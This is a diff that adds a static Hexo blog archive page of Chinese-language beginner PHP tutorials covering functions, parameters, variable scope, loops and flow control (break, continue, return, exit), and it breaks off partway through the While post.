@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta name="theme-color" content="#33474d">
+	<title>琼瑶</title>
+	<link rel="stylesheet" href="/css/style.css" />
+	
+      <link rel="alternate" href="/atom.xml" title="琼瑶" type="application/atom+xml">
+    
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+
+	<header class="header">
+		<nav class="header__nav">
+			
+				<a href="/" class="header__link" style="color: #fff">Home</a>
+			
+				<a href="/archives" class="header__link" style="color: #fff">Archive</a>
+			
+				<a href="/about" class="header__link" style="color: #fff">About</a>
+			
+		</nav>
+		<!-- <h1 class="header__title"><a href="/">琼瑶</a></h1> -->
+		<h1 class="header__title"><a href="/"><img style="width: 290px;" src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/202204152017786.png"></a></h1>
+		<h2 class="header__subtitle">梦入琼楼寒有月，行过石树冻无烟</h2>
+	</header>
+
+	<main>
+		
+	<span class="different-posts different-posts_earlier">📖 <a href="/page/31">earlier posts</a> 📖</span>
+
+
+
+
+	<article>
+	
+		<h1><a href="/2022/04/21/php/16.PHP 函数/">PHP 函数</a></h1>
+	
+	<div class="article__infos">
+		<span class="article__date">2022-04-21</span><br />
+		
+		
+			<span class="article__tags">
+			  	<a class="article__tag-none-link" href="/tags/php/" rel="tag">php</a>
+			</span>
+		
+	</div>
+
+	
+
+	
+		<p>函数(function)是指一段完成指定任务的已命名代码块，无论调用函数多少次，都只需要为页面编译一次，不用重新编译。</p>
+<h4 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h4><h5 id="自定义函数格式"><a href="#自定义函数格式" class="headerlink" title="自定义函数格式"></a>自定义函数格式</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function name() &#123;</span><br><span class="line">        // 函数代码块</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="自定义函数的执行与调用"><a href="#自定义函数的执行与调用" class="headerlink" title="自定义函数的执行与调用!"></a>自定义函数的执行与调用!<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/16.php%20%E5%87%BD%E6%95%B0.md/20201105195323443_1650849358.png"></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">		function one()&#123;</span><br><span class="line">			$a = 1;</span><br><span class="line">			$b = 1;</span><br><span class="line">			if($a == $b) &#123;</span><br><span class="line">				echo &quot;Hello,world&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; </span><br><span class="line">		one();</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="自定义函数参数"><a href="#自定义函数参数" class="headerlink" title="自定义函数参数"></a>自定义函数参数<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/16.php%20%E5%87%BD%E6%95%B0.md/20201105195314028_23657365.png"></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function name(Parameter) &#123;</span><br><span class="line">        // 函数代码块</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>或</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php </span><br><span class="line">		function one($a) &#123;</span><br><span class="line">			echo &quot;$a Hello&quot;;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		one(&quot;嘿嘿&quot;);</span><br><span class="line">		one(&quot;hey&quot;);</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="参数的传递"><a href="#参数的传递" class="headerlink" title="参数的传递"></a>参数的传递</h4><h5 id="引用方式传递"><a href="#引用方式传递" class="headerlink" title="引用方式传递 "></a>引用方式传递 <img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/16.php%20%E5%87%BD%E6%95%B0.md/20201105195258500_803588506.png"></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">		function one(&amp;$a) &#123;</span><br><span class="line">			$a = 10;</span><br><span class="line">		&#125;</span><br><span class="line">		$two;</span><br><span class="line">		one($two);</span><br><span class="line">		echo &quot;$two&quot;;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>默认的情况下，函数是通过值来进行传输的，此时如果想改变传递参数，<strong>可通过在定义函数时参数前面加上“&amp;”即可</strong></p>
+<h5 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/16.php%20%E5%87%BD%E6%95%B0.md/20201105195238405_1332834749.png"></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">		function one($a=&quot;Hello,world&quot;) &#123;</span><br><span class="line">			echo &quot;$a&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		one();</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="函数变量作用域"><a href="#函数变量作用域" class="headerlink" title="函数变量作用域"></a>函数变量作用域<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/16.php%20%E5%87%BD%E6%95%B0.md/20201105195218950_1614588663.png"></h4><p>函数变量作用域即<strong>函数内的变量外部无法访问</strong>，而只能访问函数外的变量，所以被称之为<strong>函数变量作用域</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">		$a = 1;					// 函数外的变量</span><br><span class="line">		function one() &#123;</span><br><span class="line">			$a = 10;			// 函数内的变量</span><br><span class="line">		&#125;</span><br><span class="line">		one();</span><br><span class="line">		echo &quot;$a&quot;;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;	</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/16.php%20%E5%87%BD%E6%95%B0.md/20201105195206341_65475400.png"></h4><p>在函数声明时，使用return<strong>方法可立即结束函数的运行，则返回调用函数的第一条语句执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php </span><br><span class="line">		function one($a=1) &#123;</span><br><span class="line">			echo &quot;$a&quot;;</span><br><span class="line">			return;					// 输出$a 变量后结束运行，美其名曰返回值。</span><br><span class="line">			echo &quot;Hello,world&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		one();</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+	
+
+	
+
+</article>
+
+
+
+
+	<article>
+	
+		<h1><a href="/2022/04/21/php/15.PHP 循环嵌套与流程控制/">PHP 循环嵌套与流程控制</a></h1>
+	
+	<div class="article__infos">
+		<span class="article__date">2022-04-21</span><br />
+		
+		
+			<span class="article__tags">
+			  	<a class="article__tag-none-link" href="/tags/php/" rel="tag">php</a>
+			</span>
+		
+	</div>
+
+	
+
+	
+		<h4 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h4><p>循环嵌套是指<strong>循环体内包换另一个完整的循环结构</strong>，将被称之为“循环嵌套”。目前在PHP开发语言之中，<strong>三种循环语句都可进行循环嵌套，</strong>分别为while、do、for三种循环结构。可供自由组合，外循环体中可以包含一个或多个内层循环结构，<strong>通常一个循环结构外面包围一层的循环叫做双重循环</strong>，当<strong>当包含多个的时候将被称之为“多重循环”</strong></p>
+<h5 id="For嵌套for"><a href="#For嵌套for" class="headerlink" title="For嵌套for"></a>For嵌套for<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/15.php%20%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E4%B8%8E%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6.md/20201105195141887_438208850.png"></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">		for ($i=1; $i &lt;=9 ; $i++) &#123; </span><br><span class="line">			for ($j=1; $j&lt;=$i ; $j++) &#123; </span><br><span class="line">				echo &quot;1&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h4><h5 id="break"><a href="#break" class="headerlink" title="break"></a>break<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/15.php%20%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E4%B8%8E%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6.md/20201105195130014_1233218390.png"></h5><p>break是结束当前循环的意思，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php </span><br><span class="line">		$one = 1;</span><br><span class="line">		while ($one &lt; 10) &#123;</span><br><span class="line">			if ($one&gt;6) </span><br><span class="line">				break;</span><br><span class="line">				echo &quot;$one&quot;;</span><br><span class="line">				$one++;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/15.php%20%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E4%B8%8E%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6.md/20201105195117390_1204984935.png"></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php </span><br><span class="line">		$one = 5;</span><br><span class="line">		for ($j=0; $j &lt; 10; $j++) &#123; </span><br><span class="line">			if ($j == 2) &#123;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line">			echo &quot;$j&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>与<strong>break</strong>对比来看，<strong>continue是直接跳过该数值的，而break则是直接结束循环。</strong></p>
+<h5 id="return"><a href="#return" class="headerlink" title="return"></a>return<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/15.php%20%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E4%B8%8E%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6.md/20201105195054846_1491754452.png"></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php </span><br><span class="line">		$one = 5;</span><br><span class="line">		for ($j=0; $j &lt; 10; $j++) &#123; </span><br><span class="line">			if ($j == 2) &#123;</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			echo &quot;$j&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>return与break类似，<strong>都是当程序运行数值达到“2”时，直接结束循环</strong>。</p>
+<p>​	</p>
+<h5 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/15.php%20%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E4%B8%8E%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6.md/20201105195039334_625043805.png"></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php </span><br><span class="line">		$one = 5;</span><br><span class="line">		for ($j=0; $j &lt; 10; $j++) &#123; </span><br><span class="line">			if ($j == 2) &#123;</span><br><span class="line">				exit;</span><br><span class="line">			&#125;</span><br><span class="line">			echo &quot;$j&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>exit与上述return、break类似，都是当数值循环到一定的次数时直接结束循环的运行。</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>DA</th>
+<th>FA</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>break</td>
+<td>结束当前循环</td>
+<td>结束</td>
+</tr>
+<tr>
+<td>return</td>
+<td>结束当前循环</td>
+<td></td>
+</tr>
+<tr>
+<td>exit</td>
+<td>结束当前循环</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>continue</td>
+<td>跳过当前循环数值</td>
+<td>跳过</td>
+</tr>
+</tbody></table>
+
+	
+
+	
+
+</article>
+
+
+
+
+	<article>
+	
+		<h1><a href="/2022/04/21/php/14.PHP For/">PHP For</a></h1>
+	
+	<div class="article__infos">
+		<span class="article__date">2022-04-21</span><br />
+		
+		
+			<span class="article__tags">
+			  	<a class="article__tag-none-link" href="/tags/php/" rel="tag">php</a>
+			</span>
+		
+	</div>
+
+	
+
+	
+		<p>在PHP中，For循环相对于While是一个较为复杂的循环结构，如：</p>
+<p>​	</p>
+<h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><h5 id="for基本格式"><a href="#for基本格式" class="headerlink" title="for基本格式"></a>for基本格式</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for (exor1;condition;expr2)</span><br></pre></td></tr></table></figure>
+
+<p>通常在表达式执行开始前，首先对$i&#x3D;1无条件被求值一次，通常在这设置一个初始值，如在以上表达式当中的初始值为1。</p>
+<p>在循环的开始前，其次在测试表达式中的condition值，如果条件达到则执行，否则将不执行。</p>
+<p>循环结束后执行expr2，之后在继续判断condition的值，如过条件达到则执行，否则将不执行，</p>
+<h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/14.php%20for.md/20201105195010807_1523506920.png"></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">		$one = &quot;2&quot;;</span><br><span class="line">		for ($i=1; $i &lt;= $one; $i++) &#123; </span><br><span class="line">			echo &quot;$one&quot;;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	 ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="跳出循环"><a href="#跳出循环" class="headerlink" title="跳出循环"></a>跳出循环<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/14.php%20for.md/20201105194958416_584738271.png"></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php </span><br><span class="line">		for ($i=0;;) &#123; </span><br><span class="line">			if ($i&gt;4) &#123;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">			echo &quot;$i&quot;;</span><br><span class="line">			$i++;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当循环变量大于等于4的时候将会执行if判断后跳出循环，避免死循环的诞生。</p>
+<h4 id="Foreach"><a href="#Foreach" class="headerlink" title="Foreach"></a>Foreach<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/14.php%20for.md/20201105194943496_210618639.png"></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">		$one = array(&quot;one&quot;,&quot;two&quot;,&quot;three&quot;);</span><br><span class="line">		foreach ($one as $key) &#123;			// $one as $key 意思为 $One变量如同$Key变量</span><br><span class="line">			echo &quot;$key&quot;;					// 所以输出$key变量</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>foreach循环语句和while、for循环之间的区别就是foreach循环主要用于循环数组，但也仅仅只能进行遍历数组。</p>
+
+	
+
+	
+
+</article>
+
+
+
+
+	<article>
+	
+		<h1><a href="/2022/04/21/php/13.PHP While/">PHP While</a></h1>
+	
+	<div class="article__infos">
+		<span class="article__date">2022-04-21</span><br />
+		
+		
+			<span class="article__tags">
+			  	<a class="article__tag-none-link" href="/tags/php/" rel="tag">php</a>
+			</span>
+		
+	</div>
+
+	
+
+	
+		<p>While是在开发语言中较为常用的循环语句，通常简称为<strong>“while循环，或W循环”</strong>：</p>
+<h4 id="While"><a href="#While" class="headerlink" title="While"></a>While<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/13.php%20while.md/20201105194922712_829395460.png"></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	